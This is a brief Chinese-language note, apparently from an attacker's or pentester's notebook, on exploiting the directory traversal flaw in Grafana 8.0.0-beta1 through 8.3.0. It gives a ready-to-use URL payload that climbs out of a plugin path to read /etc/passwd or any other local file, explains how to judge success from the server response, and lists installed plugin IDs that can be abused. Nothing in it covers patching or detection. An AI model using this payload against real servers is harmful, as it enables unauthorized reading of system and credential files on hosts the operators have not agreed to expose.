验证漏洞存在方法
    - 尝试访问目标主机的 `/public/plugins/[插件名]/../../../../../../../../../../../../../etc/passwd` 路径
    - 如果返回200状态码并显示文件内容，则漏洞存在
    - 如果返回"Plugin file not found"错误，则漏洞可能不存在或文件不存在

漏洞利用方法
    - Grafana 8.0.0-beta1到8.3.0版本存在目录遍历漏洞，允许通过插件路径读取任意本地文件
    - 漏洞URL路径：`<grafana_host_url>/public/plugins/[插件ID]/../../../../../../../../../../../../../[文件路径]`
    - 插件ID可以是任何已安装的插件，如：alertlist, annolist, barchart, bargauge, candlestick等
